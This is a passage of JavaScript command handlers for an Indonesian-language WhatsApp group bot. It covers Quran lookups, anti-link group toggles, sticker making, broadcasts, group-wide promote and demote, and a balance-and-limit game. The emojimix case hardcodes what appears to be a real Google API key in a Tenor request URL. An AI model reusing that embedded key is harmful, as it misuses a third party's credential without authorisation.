 const result = `📖 Ayat Al-Quran 📖\n\nSurah ${surahNumber}, Ayat ${ayatNumber}\nSurah Name: ${ayatData.surah}\n\nIsi:\n${ayatData.arab}\n\nTerjemahan:\n${ayatData.terjemahan}\n\nTafsir:\n${ayatData.tafsir}\n\nLatin:\n${ayatData.latin}\n\nAudio: ${ayatData.audio}\n\nKeterangan:\n${ayatData.keterangan}`;
 m.reply(result);
 } catch (error) {
 console.error('Error:', error);
 m.reply('Maaf, terjadi kesalahan saat mengambil informasi ayat Al-Quran. Pastikan nomor surah dan ayat yang Anda masukkan benar.');
 }
 }

 fetchAyat();
}
break

case 'carisurah': {
    const surahName = m.body.substring(10).trim(); // Nama surah yang diberikan oleh pengguna

    if (!surahName) {
        m.reply('Silakan masukkan Kode 1-114.');
        return;
    }

    // Mengambil informasi Surah dari API Al-Quran
    fetch(`https://api.alquran.cloud/v1/surah/${surahName}`)
        .then(response => response.json())
        .then(data => {
            if (!data.data) {
                m.reply('Surah dengan nama tersebut tidak ditemukan.');
                return;
            }

            const surahData = data.data;
            const surahName = surahData.englishName;
            const ayatCount = surahData.ayahs.length;

            // Menggabungkan semua ayat Surah menjadi satu teks
            let surahText = `Nama Surah: ${surahName}\nJumlah Ayat: ${ayatCount}\n\n`;

            surahData.ayahs.forEach(ayah => {
                surahText += `Ayat ${ayah.number}: ${ayah.text}\n`;
            });

            // Mengirim satu pesan dengan semua ayat
            m.reply(surahText);
        })
        .catch(error => {
            console.error('Gagal mengambil informasi Surah:', error);
            m.reply('Maaf, terjadi kesalahan saat mencari Surah. Pastikan nama Surah yang Anda masukkan benar.');
        });
}
break;

case 'antibatu': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
               if (args[0] === "on") {
if (AntiBatu) return m.reply('Already activated')
ntibatu .push(from)
fs.writeFileSync('./database/antibatu.json', JSON.stringify(ntibatu ))
m.reply('Success in turning on antiBatu in this group')
var groupe = await sky.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
} else if (args[0] === "off") {
if (!AntiBatu) return m.reply('Already deactivated')
let off = ntibatu .indexOf(from)
ntibatu .splice(off, 1)
fs.writeFileSync('./database/antibatu.json', JSON.stringify(ntibatu ))
m.reply('Success in turning off AntiBatu in this group')
                } else {
                 sky.sendPoll(m.chat, "Silahkan Dipilih, I Hope Your Happy!", [`${command.charAt(0).toUpperCase()+command.slice(1)} on`,`${command.charAt(0).toUpperCase()+command.slice(1)} off`])
                }
             }
             break
case 'antiemoji': {
    if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik');
    if (!m.isGroup) return m.reply(mess.group);
    if (!isBotAdmins) return m.reply(mess.botAdmin);
    if (!isAdmins) return m.reply(mess.admin);

    if (args[0] === "on") {
        if (ntiemoji.includes(from)) return m.reply('AntiEmoji sudah diaktifkan sebelumnya');
        ntiemoji.push(from);
        fs.writeFileSync('./database/antiemoji.json', JSON.stringify(ntiemoji));
        m.reply('Berhasil mengaktifkan AntiEmoji di grup ini');
    } else if (args[0] === "off") {
        if (!ntiemoji.includes(from)) return m.reply('AntiEmoji sudah dinonaktifkan sebelumnya');
        let off = ntiemoji.indexOf(from);
        ntiemoji.splice(off, 1);
        fs.writeFileSync('./database/antiemoji.json', JSON.stringify(ntiemoji));
        m.reply('Berhasil menonaktifkan AntiEmoji di grup ini');
    } else {
        m.reply(`Gunakan perintah: ${command} on/off untuk mengelola AntiEmoji.`);
    }
}
break;
case 'investasi': {
    if (!text) throw `Penggunaan: *investasi [jumlah] 1 = 1 adalah 1 menit`	
    m.reply('Silahkan Tunggu Sesuai Waktu Yang kamu Berikan')		    
    const investAmount = parseInt(args[0]); // Jumlah uang yang akan diinvestasikan
    const investTime = parseInt(args[1]); // Waktu investasi dalam menit
    const userBalance = db.data.users[m.sender].balance; // Saldo pengguna

    if (investAmount <= 0 || investTime <= 0 || investAmount > userBalance) {
        return m.reply('Investasi tidak valid atau saldo tidak mencukupi.');
    }

    // Simulasi hasil investasi (misalnya, hasil acak positif atau negatif)
    const randomResult = Math.random() < 0.5 ? 'untung' : 'rugi';

    // Waktu untuk menunggu hasil investasi
    setTimeout(() => {
        let result = `Hasil investasi: ${randomResult}\n`;
        if (randomResult === 'untung') {
            const profitAmount = investAmount * 0.2; // Jumlah untung (misalnya, 20% dari investasi)
            db.data.users[m.sender].balance += profitAmount;
            result += `Selamat! Anda mendapatkan +${profitAmount} balance.`;
        } else {
            // Jika rugi, saldo dikurangi dengan jumlah investasi
            db.data.users[m.sender].balance -= investAmount;
            result += `Maaf, Anda kehilangan -${investAmount} balance.`;
        }

        m.reply(result);
    }, investTime * 60000); // Konversi menit menjadi milidetik (1 menit = 60.000 milidetik)
}
break;
                  case 'banchat':{
if (!isCreator) throw mess.owner
if (!q) return m.reply(`Pilih on atau off`)
if (args[0] === "on") {
if (bocet) return m.reply('Already activated')
bacat.push(from)
fs.writeFileSync('./database/bacat.json', JSON.stringify(bacat))
m.reply('BanChat Active')
var groupe = await sky.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
sky.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nBanchat On`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!bocet) return m.reply('Already deactivated')
let off = bacat.indexOf(from)
bacat.splice(off, 1)
fs.writeFileSync('./database/bacat.json', JSON.stringify(bacat))
m.reply('Banchat Off')
} else {
 await m.reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
 }
 }
 break

case 'antilinktiktok': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
               if (args[0] === "on") {
if (AntiLinkTiktok) return m.reply('Already activated')
ntlinktt.push(from)
fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(ntlinktt))
m.reply('Success in turning on antiLinkTiktok in this group')
var groupe = await sky.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
} else if (args[0] === "off") {
if (!AntiLinktiktok) return m.reply('Already deactivated')
let off = ntlinktt.indexOf(from)
ntlinktt.splice(off, 1)
fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(ntlinktt))
m.reply('Success in turning off antiLinkTiktok n this group')
                } else {
                 sky.sendPoll(m.chat, "Silahkan Dipilih, I Hope Your Happy!", [`${command.charAt(0).toUpperCase()+command.slice(1)} on`,`${command.charAt(0).toUpperCase()+command.slice(1)} off`])
                }
             }
             break
case 'antilinkyt': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
               if (args[0] === "on") {
if (AntiLinkYt) return m.reply('Already activated')
ntlinkyt.push(from)
fs.writeFileSync('./database/antilinkyt.json', JSON.stringify(ntlinkyt))
m.reply('Success in turning on antiLinkYt in this group')
var groupe = await sky.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
} else if (args[0] === "off") {
if (!AntiLinkYt) return m.reply('Already deactivated')
let off = ntlinktt.indexOf(from)
ntlinkyt.splice(off, 1)
fs.writeFileSync('./database/antilinkyt.json', JSON.stringify(ntlinkyt))
m.reply('Success in turning off antiLinkYt in this group')
                } else {
                 sky.sendPoll(m.chat, "Silahkan Dipilih, I Hope Your Happy!", [`${command.charAt(0).toUpperCase()+command.slice(1)} on`,`${command.charAt(0).toUpperCase()+command.slice(1)} off`])
                }
             }
             break
case 'antilinkall': {
    if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik');
    if (!m.isGroup) throw mess.group;
    if (!isBotAdmins) throw mess.botAdmin;
    if (!isAdmins) throw mess.admin;
    
    if (args[0] === "on") {
        if (AntiLinkAll) return m.reply('Already activated');
        ntlinkall.push(from);
        fs.writeFileSync('./database/antilinkall.json', JSON.stringify(ntlinkall));
        m.reply('Success in turning on antiLinkAll in this group');
    } else if (args[0] === "off") {
        if (!AntiLinkAll) return m.reply('Already deactivated');
        let off = ntlinkall.indexOf(from);
        ntlinkall.splice(off, 1);
        fs.writeFileSync('./database/antilinkall.json', JSON.stringify(ntlinkall));
        m.reply('Success in turning off antiLinkAll in this group');
    } else {
        m.reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off`);
    }
}
break;
case 'antilinktwitter': {
    if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik');
    if (!m.isGroup) throw mess.group;
    if (!isBotAdmins) throw mess.botAdmin;
    if (!isAdmins) throw mess.admin;
    
    if (args[0] === "on") {
        if (AntiLinkTwitter) return m.reply('Already activated');
        ntlinktwt.push(from);
        fs.writeFileSync('./database/antilinktwitter.json', JSON.stringify(ntlinktwt));
        m.reply('Success in turning on antiLinkTwitter in this group');
    } else if (args[0] === "off") {
        if (!AntiLinkTwitter) return m.reply('Already deactivated');
        let off = ntlinktwt.indexOf(from);
        ntlinktwt.splice(off, 1);
        fs.writeFileSync('./database/antilinktwitter.json', JSON.stringify(ntlinktwt));
        m.reply('Success in turning off antiLinkTwitter in this group');
    } else {
        m.reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off`);
    }
}
break;
case 'antilinktelegram': {
    if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik');
    if (!m.isGroup) throw mess.group;
    if (!isBotAdmins) throw mess.botAdmin;
    if (!isAdmins) throw mess.admin;
    
    if (args[0] === "on") {
        if (AntiLinkTelegram) return m.reply('Already activated');
        ntlinktg.push(from);
        fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(ntlinktg));
        m.reply('Success in turning on antiLinkTelegram in this group');
    } else if (args[0] === "off") {
        if (!AntiLinkTelegram) return m.reply('Already deactivated');
        let off = ntlinktg.indexOf(from);
        ntlinktg.splice(off, 1);
        fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(ntlinktg));
        m.reply('Success in turning off antiLinkTelegram in this group');
    } else {
        m.reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off`);
    }
}
break;
case 'antilinkinstagram': {
    if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik');
    if (!m.isGroup) throw mess.group;
    if (!isBotAdmins) throw mess.botAdmin;
    if (!isAdmins) throw mess.admin;
    
    if (args[0] === "on") {
        if (antiLinkInstagram) return m.reply('Already activated');
        ntlinkig.push(from);
        fs.writeFileSync('./database/antilinkinstagram.json', JSON.stringify(ntlinkig));
        m.reply('Success in turning on antiLinkInstagram in this group');
    } else if (args[0] === "off") {
        if (!AntiLinkInstagram) return m.reply('Already deactivated');
        let off = ntlinkig.indexOf(from);
        ntlinkig.splice(off, 1);
        fs.writeFileSync('./database/antilinkinstagram.json', JSON.stringify(ntlinkig));
        m.reply('Success in turning off antiLinkInstagram in this group');
    } else {
        m.reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off`);
    }
}
break;
case 'antilinkfacebook': {
    if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik');
    if (!m.isGroup) throw mess.group;
    if (!isBotAdmins) throw mess.botAdmin;
    if (!isAdmins) throw mess.admin;
    
    if (args[0] === "on") {
        if (AntiLinkFacebook) return m.reply('Already activated');
        ntlinkfb.push(from);
        fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(ntlinkfb));
        m.reply('Success in turning on antiLinkFacebook in this group');
    } else if (args[0] === "off") {
        if (!AntiLinkFacebook) return m.reply('Already deactivated');
        let off = ntlinkfb.indexOf(from);
        ntlinkfb.splice(off, 1);
        fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(ntlinkfb));
        m.reply('Success in turning off antiLinkFacebook in this group');
    } else {
        m.reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off`);
    }
}
break;
case 'autosticker': {
    if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik');
    if (!m.isGroup) throw mess.group;
    if (!isBotAdmins) throw mess.botAdmin;
    if (!isAdmins) throw mess.admin;

    if (args[0] === "on") {
        if (autosticker.includes(from)) return m.reply('Already activated');
        autosticker.push(from);
        fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker));
        m.reply('Success in turning on autosticker in this group');
    } else if (args[0] === "off") {
        if (!autosticker.includes(from)) return m.reply('Already deactivated');
        let off = autosticker.indexOf(from);
        autosticker.splice(off, 1);
        fs.writeFileSync('./database/autosticker.json', JSON.stringify(autosticker));
        m.reply('Success in turning off autosticker in this group');
    } else {
        m.reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off`);
    }
}
break;
     case 'antipushkontakv1': {
    if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik');
    if (!m.isGroup) return m.reply(mess.group);
    if (!isAdmins && !isGroupOwner && !isCreator) return mess.admin;
    if (!isBotAdmins) return mess.botAdmin;

    if (args[0] === "on") {
        if (db.data.chats[m.chat].antipushkontakv1) return m.reply('Already activated');
        db.data.chats[m.chat].antipushkontakv1 = true;
        m.reply('Anti Push Kontak Aktif 🕊️');
    } else if (args[0] === "off") {
        if (!db.data.chats[m.chat].antipushkontakv1) return m.reply('Already deactivated');
        db.data.chats[m.chat].antipushkontakv1 = false;
        m.reply('Anti Push Kontak Nonaktif 🕊️');
    } else {
        m.reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off`);
    }
}
break;
         case 'antipushkontakv2': {
    if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik');
    if (!m.isGroup) return m.reply(mess.group);
    if (!isAdmins && !isGroupOwner && !isCreator) return mess.admin;
    if (!isBotAdmins) return mess.botAdmin;

    if (args[0] === "on") {
        if (db.data.chats[m.chat].antipushkontakv2) return m.reply('Already activated');
        db.data.chats[m.chat].antipushkontakv2 = true;
        m.reply('Anti Push Kontak Aktif 🕊️');
    } else if (args[0] === "off") {
        if (!db.data.chats[m.chat].antipushkontakv2) return m.reply('Already deactivated');
        db.data.chats[m.chat].antipushkontakv2 = false;
        m.reply('Anti Push Kontak Nonaktif 🕊️');
    } else {
        m.reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off`);
    }
}
break;
case 'sound': {
            
    const soundNumber = parseInt(args[0]);

    if (isNaN(soundNumber) || soundNumber < 1 || soundNumber > 161) {
        throw 'Masukkan nomor suara antara 1 dan 161.';
    }
m.reply(mess.wait)
    const soundURL = `https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/sound${soundNumber}.mp3`;
    const soundBuffer = await getBuffer(soundURL);

    await sky.sendMessage(m.chat, { audio: soundBuffer, mimetype: 'audio/mp4', ptt: true }, { quoted: m });
}
break
case 'ltbb_': {
    const ltbbNumber = parseInt(args[0]);

    if (isNaN(ltbbNumber) || ltbbNumber < 2 || ltbbNumber > 338) {
        throw 'Masukkan ltbb_ 001 sampai 338.';
    }
    
    m.reply(mess.wait);
    
    const ltbbName = `ltbb_${String(ltbbNumber).padStart(3, '0')}`;
    const ltbbURL = `https://www.nonstick.com/audio/soundsource/Bugs_Bunny/${ltbbName}.mp3`;
    const ltbbBuffer = await getBuffer(ltbbURL);

    await sky.sendMessage(m.chat, { audio: ltbbBuffer, mimetype: 'audio/mp4', ptt: true }, { quoted: m });
}
break;
            case 'welcome':{
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
if (!q) return m.reply(`Pilih on atau off`)
if (args[0] === "on") {
if (isWelcome) return m.reply(`Welcome sudah aktif`)
welcome.push(m.chat)
fs.writeFileSync('./database/welcome.json', JSON.stringify(welcome, null, 2))
m.reply(`Sukses mengaktifkan welcome di grup ini`)
} else if (args[0] === "off") {
if (!isWelcome) return m.reply(`Welcome sudah nonaktif`)
var posi = welcome.indexOf(m.chat)
welcome.splice(posi, 1)
fs.writeFileSync('./database/welcome.json', JSON.stringify(welcome, null, 2))
m.reply(`Sukses menonaktifkan welcome di grup ini`)
} else {
m.reply(`Pilih on atau off`)
}
}
break
            case 'mute': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
 if (!m.isGroup) throw mess.group
 if (!isAdmins) throw mess.admin
 if (args[0].toLowerCase() === "on") {
 if (db.data.chats[m.chat].mute) return m.reply(`Sudah Aktif Sebelumnya`)
 db.data.chats[m.chat].mute = true
 m.reply(`${sky.user.name} telah di mute di group ini !`)
 } else if (args[0].toLowerCase() === "off") {
 if (!db.data.chats[m.chat].mute) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
 db.data.chats[m.chat].mute = false
 m.reply(`${sky.user.name} telah di unmute di group ini !`)
 } else {
 m.reply('contoh mute on / off')
 }
 }
 break
                        case 'ephemeral': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0].toLowerCase() === '1') {
                    await sky.groupToggleEphemeral(m.chat, 1*24*3600).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0].toLowerCase() === '7') {
                    await sky.groupToggleEphemeral(m.chat, 7*24*3600).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0].toLowerCase() === '90') {
                    await sky.groupToggleEphemeral(m.chat, 90*24*3600).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0].toLowerCase() === 'off') {
                    await sky.groupToggleEphemeral(m.chat, 0).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else {
                    sky.sendPoll(m.chat, "Silahkan Dipilih, I Hope Your Happy!", ["Ephemeral 1","Ephemeral 7","Ephemeral 90","Ephemeral Disable"])
                }
            }
            break
             case 'setnamabot': case 'setnamebot': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
            if (!text) throw `Example : ${prefix + command} WhatsApp ✅`
            let name = await sky.updateProfileName(text)
            m.reply(`Successfully renamed bot to ${name}`)
            }
            break
            case 'setstatus': case 'setbiobot': case 'setbotbio': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
            if (!text) throw `this is a WhatsApp Bot named sky-Morou`
            let name = await sky.updateProfileStatus(text)
            m.reply(`Successfully changed bot bio status to ${name}`)
            }
            break
case'demoteall':
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
var groupe = await sky.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
sky.groupParticipantsUpdate(from, mems, 'demote')
break
//=================================================//
case'promoteall':
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
var groupe = await sky.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
sky.groupParticipantsUpdate(from, mems, 'promote')
break
            case 'anticall': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
            if (!isCreator) throw mess.owner
                let ciko = db.data.settings[botNumber].anticall
                if (args[0].toLowerCase() === "on") {
                if (ciko) return m.reply(`Sudah Aktif Sebelumnya`)
                ciko = true
                m.reply(`AntiCall Aktif !`)
                } else if (args[0].toLowerCase() === "off") {
                if (!ciko) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
                ciko = false
                m.reply(`AntiCall Tidak Aktif !`)
                } else {
                sky.sendPoll(m.chat, "Silahkan Dipilih, I Hope Your Happy!", [`${command.charAt(0).toUpperCase()+command.slice(1)} On`,`${command.charAt(0).toUpperCase()+command.slice(1)} Off`])
                }
             }
             break
      case 'del': case 'delete': case 'd':{         
         if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins) throw mess.admin     
sky.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: m.quoted.id,
participant: m.quoted.sender
}
})
}
break
                        case 'bc': case 'broadcast': case 'bcall': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                if (!isCreator) throw mess.owner
                if (!text) throw `Text mana?\n\nExample : ${prefix + command} ikyy-san`
                let anu = await store.chats.all().map(v => v.id)
                m.reply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`)
    		for (let yoi of anu) {
    		    await sleep(1500)
    		    let txt = `「 Broadcast Bot 」\n\n${text}`
                      sky.sendText(yoi, txt)    		  
    		}
    		m.reply('Sukses Broadcast')
            }
            break
              





            	    case'delsesi':
            case 'clearsession': {
 if (!isCreator) return m.reply(mess.owner);
 
 // Ambil jumlah file yang ingin dihapus dari input (q)
 if (!q) return m.reply(`Masukkan jumlah yang ingin dihapus`);

 let jumlah = parseInt(q);

 // Cek apakah input jumlah valid
 if (isNaN(jumlah) || jumlah <= 0) {
 return m.reply("Jumlah yang dimasukkan tidak valid. Harap masukkan angka yang valid.");
 }

 fs.readdir("./sky", async function(err, files) {
 if (err) {
 console.log('Unable to scan directory: ' + err);
 return m.reply('Tidak dapat memindai direktori: ' + err);
 }

 let filteredArray = files.filter(item => 
 item.startsWith("pre-key") ||
 item.startsWith("sender-key") || 
 item.startsWith("sky-") || 
 item.startsWith("app-state") || 
 item.startsWith("session")
 );

 // Jika input jumlah lebih besar dari jumlah file yang tersedia
 if (jumlah > filteredArray.length) {
 return m.reply(`Hanya tersedia ${filteredArray.length} file untuk dihapus.`);
 }

 // Pilih file secara acak sejumlah yang diminta
 filteredArray = filteredArray.sort(() => 0.5 - Math.random()).slice(0, jumlah);

 m.reply(`Sedang membersihkan ${jumlah} file...`);

 filteredArray.forEach(function(file) {
 fs.unlinkSync(`./sky/${file}`);
 });

 m.reply(`Sukses membersihkan ${jumlah} file.`);
 });
}
break
            case 'listpc': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
                 for (let i of anu) {
                     let nama = store.messages[i].array[0].pushName
                     teks += `⬡ *Nama :* ${nama}\n⬡ *User :* @${i.split('@')[0]}\n⬡ *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
                 }
                 sky.sendTextWithMentions(m.chat, teks, m)
             }
             break
                case 'listgc': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                 let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
                 for (let i of anu) {
                     let metadata = await sky.groupMetadata(i)
                     teks += `⬡ *Nama :* ${metadata.subject}\n⬡ *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Tidak diketahui'}\n⬡ *ID :* ${metadata.id}\n⬡ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n⬡ *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
                 }
                 sky.sendTextWithMentions(m.chat, teks, m)
             }
             break
             case 'listonline': case 'liston': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                    let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                    let online = [...Object.keys(store.presences[id]), botNumber]
                    sky.sendText(m.chat, 'List Online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
             }
             break
                        case 'stickerwm': case 'swm': case 'stickergifwm': case 'sgifwm': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
                let [teks1, teks2] = text.split`|`
                if (!teks1) throw `Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`
                if (!teks2) throw `Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`
            	m.reply(mess.wait)
                if (/image/.test(mime)) {
                    let media = await sky.downloadMediaMessage(qmsg)
                    let encmedia = await sky.sendImageAsSticker(m.chat, media, m, { packname: teks1, author: teks2 })
                    await fs.unlinkSync(encmedia)
                } else if (/video/.test(mime)) {
                    if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
                    let media = await sky.downloadMediaMessage(qmsg)
                    let encmedia = await sky.sendVideoAsSticker(m.chat, media, m, { packname: teks1, author: teks2 })
                    await fs.unlinkSync(encmedia)
                } else {
                    throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
                }
            }
            break           
            case 'ebinary': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
            if (!text) throw `Example : ${prefix + command} text`
            let { eBinary } = require('./lib/binary')
            let eb = await eBinary(text)
            m.reply(eb)
        }
        break
            case 'dbinary': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
            if (!text) throw `Example : ${prefix + command} text`
            let { dBinary } = require('./lib/binary')
            let db = await dBinary(text)
            m.reply(db)
        }
        break
// Case untuk menghitung selisih waktu antara dua tanggal
case 'count': {
  const datePattern = /^(\d{2})-(\d{2})-(\d{4})$/;

  const startDateMatch = args[0].match(datePattern);
  const endDateMatch = args[1].match(datePattern);

  if (!startDateMatch || !endDateMatch) {
    await sky.sendText(from, 'Gunakan perintah dengan format yang benar, contoh: "count DD-MM-YYYY DD-MM-YYYY".');
    return;
  }

  const startDate = new Date(`${startDateMatch[3]}-${startDateMatch[2]}-${startDateMatch[1]}`);
  const endDate = new Date(`${endDateMatch[3]}-${endDateMatch[2]}-${endDateMatch[1]}`);

  if (isNaN(startDate) || isNaN(endDate)) {
    await sky.sendText(from, 'Tanggal yang dimasukkan tidak valid.');
    return;
  }

  const timeDifference = endDate - startDate;
  const millisecondsPerMinute = 60 * 1000; // Jumlah milidetik dalam satu menit
  const millisecondsPerHour = 60 * millisecondsPerMinute; // Jumlah milidetik dalam satu jam
  const millisecondsPerDay = 24 * millisecondsPerHour; // Jumlah milidetik dalam satu hari

  const totalDays = Math.floor(timeDifference / millisecondsPerDay);
  const totalHours = Math.floor((timeDifference % millisecondsPerDay) / millisecondsPerHour);
  const totalMinutes = Math.floor((timeDifference % millisecondsPerHour) / millisecondsPerMinute);
  const totalWeeks = Math.floor(totalDays / 7);

  const resultMessage = `Selisih waktu antara tanggal ${args[0]} dan ${args[1]} adalah:\n\n(${totalDays} hari) (${totalWeeks} minggu).`;

  await sky.sendText(from, resultMessage);
}
break;
case 'geturl': {				
         	if (!text) throw `Example : ${prefix + command} url/link`
             m.reply(mess.wait)
             let igmk = await getBuffer(`${text}`)
             sky.sendMessage(m.chat, { image: igmk}, { quoted: m }).catch((err) => m.reply(mess.error))
         	}
         break
            case 'emojimix': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
		let [emoji1, emoji2] = text.split`+`
		if (!emoji1) throw `Example : ${prefix + command} 😅+🤔`
		if (!emoji2) throw `Example : ${prefix + command} 😅+🤔`
		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anu.results) {
		    let encmedia = await sky.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break	 
	    case 'joincall':{
sky.relayMessage(m.chat, {
		scheduledCallCreationMessage: {
		callType: "VIDEO",		
		scheduledTimestampMs: 12000,
		title: botname,		
		inviteCode: 'wa.me/6283870640443',
		}
	}, {})
	}
	break
	             case 'ceklimit': case 'checklimit': case 'limit':{
     let who
    if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.sender
    else who = m.sender
    if (typeof db.data.users[who] == 'undefined') throw 'Pengguna tidak ada didalam data base'
    m.reply(`Nomer : ${who}\n\nLimit\n> ${db.data.users[who].limit} 🪙\n\nBalance\n> Rp.${db.data.users[who].balance} 💸`)
					}
					break
					case 'buylimit': {
  const pricePerLimit = 150; // Harga per limit dalam balance
  const amountToBuy = parseInt(args[0]);
  if (isNaN(amountToBuy) || amountToBuy <= 0) {
    throw 'Gunakan: *.buylimit <jumlah>*\nContoh: *.buylimit 5*';
  }
  const totalCost = pricePerLimit * amountToBuy;
  if (db.data.users[m.sender].balance < totalCost) {
    throw 'Balance Anda tidak mencukupi untuk membeli limit sebanyak ini.';
  }
  db.data.users[m.sender].balance -= totalCost;
  db.data.users[m.sender].limit += amountToBuy;
  m.reply(`Anda telah membeli ${amountToBuy} limit dengan harga ${totalCost} balance.`);
  break;
}

					case 'getlimit':{
				 if (!isCreator) throw mess.owner
